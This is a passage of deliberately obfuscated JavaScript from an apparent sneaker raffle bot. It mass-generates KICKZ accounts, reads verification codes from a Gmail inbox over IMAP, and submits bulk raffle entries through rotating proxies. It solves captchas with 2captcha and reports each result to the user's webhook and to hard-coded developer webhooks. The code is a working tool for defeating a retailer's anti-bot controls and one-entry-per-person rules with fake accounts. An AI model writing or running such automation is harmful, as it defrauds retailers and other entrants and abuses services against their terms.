                        console['log'](_0x38a61b() + '\x20[' + _0x5eeb76['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x50bbaf['type']('#comp_firstname', '' + _0x4dc38f[_0x14879c]['FirstName']), await _0x50bbaf['waitForSelector']('#comp_lastname'), await _0x50bbaf['type']('#comp_lastname', '' + _0x4dc38f[_0x14879c]['LastName']), await _0x50bbaf['waitForSelector']('#comp_email'), await _0x50bbaf['type']('#comp_email', '' + _0x4dc38f[_0x14879c]['Email']), await _0x50bbaf['waitForSelector']('#comp_paypalemail'), await _0x50bbaf['type']('#comp_paypalemail', '' + _0x4dc38f[_0x14879c]['Email']), await _0x50bbaf['waitForSelector']('#comp_mobile_end'), await _0x50bbaf['type']('#comp_mobile_end', '' + _0x4dc38f[_0x14879c]['Phone']), await _0x50bbaf['waitForSelector']('#comp_dob'), await _0x50bbaf['type']('#comp_dob', '08/09/1992'), console['log'](_0x38a61b() + '\x20[' + _0x5eeb76['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x4dc38f[_0x14879c]['Size'] == 'RANDOM') {
                            const _0x570056 = await _0x50bbaf['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x36477d => {
                                return _0x36477d['map'](_0x27bcac => _0x27bcac['value']);
                            });
                            var _0x1af3ee = Math['round'](Math['random']() * (_0x570056['length'] - 0x2));
                            await _0x50bbaf['select']('#shoesize', _0x570056[_0x1af3ee + 0x1]), await _0xbbd9dc(0x3e8);
                        } else {
                            const _0x2a3ef2 = await _0x50bbaf['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x262b47 => {
                                return _0x262b47['map'](_0x193d31 => _0x193d31['innerText']);
                            }), _0x1db4af = await _0x50bbaf['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1fc6fc => {
                                return _0x1fc6fc['map'](_0x1173c5 => _0x1173c5['value']);
                            });
                            var _0x22d208 = _0x4dc38f[_0x14879c]['Size'];
                            for (var _0x4ed50c = 0x1; _0x4ed50c < _0x1db4af['length']; _0x4ed50c++) {
                                var _0x155e75 = _0x2a3ef2[_0x4ed50c]['split']('\x20')[0x0];
                                if (_0x155e75 == _0x22d208) {
                                    await _0x50bbaf['select']('#shoesize', _0x1db4af[_0x4ed50c]);
                                    break;
                                } else {
                                    if (_0x4ed50c + 0x1 == _0x1db4af['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x50bbaf['waitForSelector']('#comp_address1'), await _0x50bbaf['type']('#comp_address1', _0x4dc38f[_0x14879c]['Address1'] + '\x20' + _0x4dc38f[_0x14879c]['HouseNumber']), await _0x50bbaf['waitForSelector']('#comp_address2'), await _0x50bbaf['type']('#comp_address2', '' + _0x4dc38f[_0x14879c]['Address2']), await _0x50bbaf['waitForSelector']('#comp_address2'), await _0x50bbaf['type']('#comp_address3', '' + _0x4dc38f[_0x14879c]['City']), await _0x50bbaf['waitForSelector']('#comp_postcode'), await _0x50bbaf['type']('#comp_postcode', '' + _0x4dc38f[_0x14879c]['Zip']), console['log'](_0x38a61b() + '\x20[' + _0x5eeb76['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xbbd9dc(0x4b0), await _0x50bbaf['click']('label#emailhold'), await _0xbbd9dc(0x5dc), await _0x50bbaf['click']('#preauth_tandc_email\x20>\x20label'), await _0xbbd9dc(0x5dc), await _0x50bbaf['click']('#submit'), await _0x50bbaf['waitForSelector']('#paymentWrap'), console['log'](_0x38a61b() + '\x20[' + _0x5eeb76['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20' + _0x19e6c5['blue']('Awaiting\x20Paypal\x20Payment')), _0xcc4dce['on']('targetcreated', async _0x27a9e7 => {
                            if (_0x27a9e7['type']() === 'page') {
                                const _0x596f0a = await _0x27a9e7['page']();
                                async function _0x38cd02() {
                                    try {
                                        await _0x50bbaf['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x42586b = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x54da2b() {
                                    try {
                                        await _0x50bbaf['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x2ec054 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x54da2b(), _0x38cd02(), await _0xbbd9dc(0x493e0);
                            }
                        });
                        async function _0xfaae20() {
                            for (let _0x250472 = 0x0; _0x250472 < 0x12c; _0x250472++) {
                                if (_0x2ec054 == !![]) {
                                    _0x2c9574 = 'no', _0x5d1d0f(_0x4dc38f[_0x14879c], _0x5eeb76), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x5eeb76['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                                        try {
                                            await _0x4236dd(_0x9a51aa['webhook'], _0x57c45c['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x57c45c['succesDEVMSG']), await _0xbbd9dc(0xc8);
                                    try {
                                        await _0x4236dd(_0x4d6262, _0x57c45c['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x42586b)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0xbbd9dc(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0xbbd9dc(0xbb8), await _0x50bbaf['click']('.zoid-outlet'), await _0xbbd9dc(0x7d0), await _0xfaae20();
                    } catch (_0x2eab84) {
                        console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x5eeb76['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20' + _0x2eab84)), _0xf0e795 = '' + _0x2eab84;
                        var _0x440bcc = await _0x23dc1b(_0x4dc38f[_0x14879c], _0x5eeb76, 'dev', !![], _0xf0e795);
                        _0x57c45c['errorDEV'] = { 'embeds': [_0x440bcc] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x57c45c['errorDEV']), await _0x4236dd(_0x48c50b, _0x57c45c['errorDEV']);
                    } finally {
                        _0xcc4dce && _0xcc4dce['close']();
                        if (_0x2c9574 == 'yes' && _0x529635 != 0x5 && _0xf0e795 != 'Size\x20Not\x20Found') {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x5eeb76['name'] + ']\x20Task\x20' + (_0x14879c + 0x1) + '\x20:\x20Retrying')), _0x14879c = _0x14879c - 0x1, _0x529635 = _0x529635 + 0x1;
                            continue;
                        }
                        _0x2c9574 == 'yes' && _0x529635 >= 0x5 && (_0xc8d9fd(afew[_0x14879c], _0x5eeb76), _0x2c9574 = 'no', _0x529635 = 0x0), console['log']('Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1e5590, _0x59b9a8, _0x51172f) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4a4c3a = 0x0; _0x4a4c3a < _0x59b9a8['length']; _0x4a4c3a++) {
                        const _0x37f969 = 'https://www.kickz.com/login';
                        if (_0x8c2c6d != 'yes')
                            var _0x8c2c6d = '', _0x43e84f = 0x0;
                        _0x1f02d2(_0x1e5590['name'] + '\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20/\x20' + _0x59b9a8['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x59b9a8, _0x4a4c3a);
                        var _0x328683 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x213f4d
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x9a51aa['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x198625
                                }
                            ]
                        }];
                        const _0x2d5b9d = { 'embeds': _0x328683 };
                        var _0x52ad8f = await _0x23dc1b(_0x59b9a8[_0x4a4c3a], _0x1e5590, 'acc', ![]);
                        const _0x408173 = { 'succesDEVMSG': { 'embeds': [_0x52ad8f] } };
                        if (_0x59b9a8[_0x4a4c3a]['Email'] == '' || _0x59b9a8[_0x4a4c3a]['FirstName'] == '' || _0x59b9a8[_0x4a4c3a]['LastName'] == '') {
                            console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x59b9a8[_0x4a4c3a]['Password'] == '' && (_0x59b9a8[_0x4a4c3a]['Password'] = 'JRaffles23!');
                        if (_0x9a51aa['useRandomProxy'] = ![])
                            var _0x274419 = _0x51172f[_0x4a4c3a]['split'](':');
                        else
                            var _0x4ad68b = Math['round'](Math['random']() * (_0x51172f['length'] - 0x1)), _0x274419 = _0x51172f[_0x4ad68b]['split'](':');
                        const _0x18cecc = await _0x6d7b51['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x274419[0x0] + ':' + _0x274419[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x5a7067 = await _0x18cecc['newPage']();
                            await _0x5a7067['authenticate']({
                                'username': '' + _0x274419[0x2],
                                'password': '' + _0x274419[0x3]
                            }), console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a7067['setRequestInterception'](!![]), _0x5a7067['on']('request', _0x2a1ecc => {
                                _0x2a1ecc['resourceType']() === 'image' || _0x2a1ecc['resourceType']() === 'font' || _0x2a1ecc['resourceType']() === 'media' ? _0x2a1ecc['abort']() : _0x2a1ecc['continue']();
                            }), await _0x5a7067['goto'](_0x37f969), await _0xbbd9dc(0xbb8), console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x5a7067['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5a7067['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5a7067['waitForSelector']('#button-register'), await _0xbbd9dc(0x7d0), await _0x5a7067['evaluate'](() => {
                                const _0x2d8dd1 = document['querySelector']('#button-register');
                                _0x2d8dd1['click']();
                            }), console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xbbd9dc(0x1388), await _0x5a7067['waitForSelector']('#customer_salutation'), await _0x5a7067['select']('#customer_salutation', 'mr'), await _0xbbd9dc(0x7d0), await _0x5a7067['waitForSelector']('#customer_firstname'), await _0x5a7067['type']('#customer_firstname', '' + _0x59b9a8[_0x4a4c3a]['FirstName']), await _0xbbd9dc(0x352), await _0x5a7067['waitForSelector']('#customer_lastname'), await _0x5a7067['type']('#customer_lastname', '' + _0x59b9a8[_0x4a4c3a]['LastName']), await _0xbbd9dc(0x352), await _0x5a7067['type']('#email-input', '' + _0x59b9a8[_0x4a4c3a]['Email']), await _0xbbd9dc(0x352), await _0x5a7067['type']('#email-confirm-input', '' + _0x59b9a8[_0x4a4c3a]['Email']), await _0xbbd9dc(0x352), await _0x5a7067['type']('#register-password', '' + _0x59b9a8[_0x4a4c3a]['Password']), await _0xbbd9dc(0x352), await _0x5a7067['type']('#password-confirm', '' + _0x59b9a8[_0x4a4c3a]['Password']), await _0xbbd9dc(0x352), console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x5a7067['click']('#consent'), await _0xbbd9dc(0x1f4);
                            const _0x1e9361 = await _0x5a7067['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x1e9361) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x5a7067['click']('#buttonRegister');
                            try {
                                await _0x5a7067['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x59b9a8[_0x4a4c3a]['Email']), await _0xbbd9dc(0x4b0);
                            async function _0x4a8e7c() {
                                var _0x5ac817, _0x453932 = ![];
                                for (var _0x5b26dc = 0x0; _0x5b26dc < 0x18; _0x5b26dc++) {
                                    async function _0x464b0b() {
                                        var _0x37e0f9 = new _0x9597be({
                                            'user': _0x9a51aa['masterMail'],
                                            'password': _0x9a51aa['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5bb60e(_0x413500) {
                                            _0x37e0f9['openBox']('INBOX', ![], _0x413500);
                                        }
                                        _0x37e0f9['once']('ready', function () {
                                            console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5bb60e(function (_0x21ae71, _0x23efad) {
                                                console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x21ae71)
                                                    throw _0x21ae71;
                                                _0x37e0f9['seq']['search'](['UNSEEN'], function (_0x5621d7, _0x2b8c45) {
                                                    if (!_0x2b8c45 || !_0x2b8c45['length'])
                                                        console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x37e0f9['end']();
                                                    else {
                                                        var _0x51728d = _0x37e0f9['seq']['fetch'](_0x2b8c45, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x51728d['on']('message', function (_0x304f21, _0x2138fe) {
                                                            var _0x2dd92d = '(#' + _0x2138fe + ')\x20';
                                                            _0x304f21['on']('body', function (_0x3db818, _0x310bf0) {
                                                                _0x45ab86(_0x3db818, (_0x178ecd, _0x381887) => {
                                                                    if (_0x381887['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x5999b9 = _0x381887['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x193ea1 = _0x5999b9[0x1]['split']('<')[0x0];
                                                                        _0x5ac817 = _0x193ea1;
                                                                    }
                                                                });
                                                            }), _0x304f21['once']('end', function () {
                                                            });
                                                        }), _0x51728d['once']('error', function (_0x1da41c) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x51728d['once']('end', function () {
                                                            _0x37e0f9['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x37e0f9['once']('error', function (_0x5cf60d) {
                                            console['log'](_0x19e6c5['red'](_0x5cf60d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x453932 = !![];
                                        }), _0x37e0f9['once']('end', async function () {
                                        }), _0x37e0f9['connect']();
                                    }
                                    _0x464b0b(), await _0xbbd9dc(0x1388);
                                    if (_0x5ac817)
                                        return _0x5ac817;
                                    if (_0x453932)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5b26dc == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4a8e7c(), _0xbbd9dc(0x320), console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Verifying..'), await _0x5a7067['type']('#verificationCode', code), await _0xbbd9dc(0x1f4), await _0x5a7067['click']('#buttonVerify'), await _0xbbd9dc(0x190), await _0x5a7067['click']('#buttonVerify'), await _0xbbd9dc(0x3e8);
                            try {
                                await _0x5a7067['waitForSelector']('div.b-user_greeting'), _0x8c2c6d = 'no', console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Account\x20' + _0x59b9a8[_0x4a4c3a]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x80a504['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x59b9a8[_0x4a4c3a]['Email'] + ',' + _0x59b9a8[_0x4a4c3a]['Password'] + ','), console['log'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Account\x20' + _0x59b9a8[_0x4a4c3a]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x408173['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4236dd(_0xe1dcb8, _0x408173['succesDEVMSG']);
                            } catch {
                                _0x8c2c6d = 'no', console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x6ee6fc) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20' + _0x6ee6fc)), _0x328683[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x328683[0x0]['description'] = '' + _0x6ee6fc, await _0x4236dd(_0x48c50b, _0x2d5b9d), _0x8c2c6d = 'yes';
                        } finally {
                            _0x18cecc && _0x18cecc['close']();
                            if (_0x8c2c6d == 'yes' && _0x43e84f != 0x5) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x1e5590['name'] + ']\x20Task\x20' + (_0x4a4c3a + 0x1) + '\x20:\x20Retrying')), _0x4a4c3a = _0x4a4c3a - 0x1, _0x43e84f = _0x43e84f + 0x1;
                                continue;
                            }
                            _0x8c2c6d == 'yes' && _0x43e84f >= 0x5 && (_0xc8d9fd(_0x59b9a8[_0x4a4c3a], _0x1e5590), _0x8c2c6d = 'no', _0x43e84f = 0x0), console['log']('Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0xcaab4c, _0x5a4286, _0x242df3) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1068e1 = 0x0; _0x1068e1 < _0x5a4286['length']; _0x1068e1++) {
                        var _0x33696f;
                        if (_0x587126 != 'yes')
                            var _0x587126 = '', _0x2393a4 = 0x0;
                        _0x1f02d2(_0xcaab4c['name'] + '\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20/\x20' + _0x5a4286['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa);
                        var _0x3940ae = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x213f4d
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x5a4286[_0x1068e1]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x5a4286[_0x1068e1]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x9a51aa['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x198625
                                }
                            ]
                        }], _0x546aec = await _0x23dc1b(_0x5a4286[_0x1068e1], _0xcaab4c, 'dev', ![]), _0x1551f7 = await _0x23dc1b(_0x5a4286[_0x1068e1], _0xcaab4c, 'pub', ![]);
                        const _0x1f6648 = {
                            'succesDEVMSG': { 'embeds': [_0x546aec] },
                            'succesPUBMSG': { 'embeds': [_0x1551f7] }
                        };
                        await _0x2f5330(_0x5a4286, _0x1068e1);
                        if (_0x5a4286[_0x1068e1]['Email'] == '' || _0x5a4286[_0x1068e1]['Password'] == '' || _0x5a4286[_0x1068e1]['FirstName'] == '' || _0x5a4286[_0x1068e1]['LastName'] == '') {
                            console['log'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x9a51aa['useRandomProxy'] = ![])
                            var _0x16e929 = _0x242df3[_0x1068e1]['split'](':');
                        else
                            var _0x425898 = Math['round'](Math['random']() * (_0x242df3['length'] - 0x1)), _0x16e929 = _0x242df3[_0x425898]['split'](':');
                        const _0x25aa60 = await _0x6d7b51['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x16e929[0x0] + ':' + _0x16e929[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x5604ce = await _0x25aa60['newPage']();
                            await _0x5604ce['authenticate']({
                                'username': '' + _0x16e929[0x2],
                                'password': '' + _0x16e929[0x3]
                            }), console['log'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5604ce['setRequestInterception'](!![]), _0x5604ce['on']('request', _0x1cc3fa => {
                                _0x1cc3fa['resourceType']() === 'image' || _0x1cc3fa['resourceType']() === 'font' || _0x1cc3fa['resourceType']() === 'media' ? _0x1cc3fa['abort']() : _0x1cc3fa['continue']();
                            }), await _0x5604ce['goto']('' + _0x5a4286[_0x1068e1]['Url'], { 'waitUntil': 'networkidle2' }), await _0xbbd9dc(0x12c);
                            try {
                                await _0x5604ce['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x5604ce['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5604ce['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5604ce['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5604ce['waitForSelector']('#username'), await _0x5604ce['type']('#username', _0x5a4286[_0x1068e1]['Email']), await _0x5604ce['waitForSelector']('#password'), await _0x5604ce['type']('#password', _0x5a4286[_0x1068e1]['Password']), await _0xbbd9dc(0x190), await _0x5604ce['click']('#buttonSubmit'), await _0x5604ce['waitForSelector']('div.b-user_greeting'), console['log'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Getting\x20Product'), await _0xbbd9dc(0x1f4), await _0x5604ce['goto']('' + _0x5a4286[_0x1068e1]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x5a4286[_0x1068e1]['Size']);
                            let _0x475662 = _0x5a4286[_0x1068e1]['Size']['replace']('.5', '\x201/2');
                            await _0x5604ce['click']('button[title=\x22' + _0x475662 + '\x22]'), await _0xbbd9dc(0x1f4);
                            try {
                                await _0x5604ce['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0xbbd9dc(0x12c), console['log'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5604ce['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xbbd9dc(0x12c), await _0x5604ce['type']('#dwfrm_raffle_addressFields_firstName', _0x5a4286[_0x1068e1]['FirstName']), await _0xbbd9dc(0x12c), await _0x5604ce['type']('#dwfrm_raffle_addressFields_lastName', _0x5a4286[_0x1068e1]['LastName']), await _0xbbd9dc(0x12c), await _0x5604ce['select']('#dwfrm_raffle_addressFields_country', _0x5a4286[_0x1068e1]['Country']), await _0xbbd9dc(0x12c), await _0x5604ce['type']('#dwfrm_raffle_addressFields_city', _0x5a4286[_0x1068e1]['City']), await _0xbbd9dc(0x12c);
                            _0x5a4286[_0x1068e1]['Postcode'] == undefined && (_0x5a4286[_0x1068e1]['Postcode'] = _0x5a4286[_0x1068e1]['Zip']);
                            await _0x5604ce['type']('#dwfrm_raffle_addressFields_postalCode', _0x5a4286[_0x1068e1]['Postcode']), await _0xbbd9dc(0x12c), await _0x5604ce['type']('#dwfrm_raffle_addressFields_address1', _0x5a4286[_0x1068e1]['Address1']), await _0xbbd9dc(0x12c), await _0x5604ce['type']('#dwfrm_raffle_addressFields_address2', _0x5a4286[_0x1068e1]['HouseNumber']), await _0xbbd9dc(0x12c), await _0x5604ce['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x5a4286[_0x1068e1]['Address2']), await _0xbbd9dc(0x12c), await _0x5604ce['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xbbd9dc(0x12c), await _0x5604ce['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x5a4286[_0x1068e1]['Follower']), await _0xbbd9dc(0x1f4), await _0x5604ce['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xbbd9dc(0x1f4), console['log'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20' + _0x19e6c5['blue']('Awaiting\x20Paypal\x20Payment')), await _0x5604ce['click']('.b-paypal_button');
                            try {
                                await _0x5604ce['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x587126 = 'no', _0x5d1d0f(_0x5a4286[_0x1068e1], _0xcaab4c), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x1f6648['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x1f6648['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x4d6262, _0x1f6648['succesPUBMSG']);
                            } catch (_0x498ad4) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x498ad4)), _0x33696f = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x498ad4;
                                var _0x406bd2 = await _0x23dc1b(_0x5a4286[_0x1068e1], _0xcaab4c, 'dev', !![], _0x33696f);
                                _0x1f6648['errorDEV'] = { 'embeds': [_0x406bd2] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x1f6648['errorDEV']), await _0x4236dd(_0x48c50b, _0x1f6648['errorDEV']);
                            }
                        } catch (_0x57cfdb) {
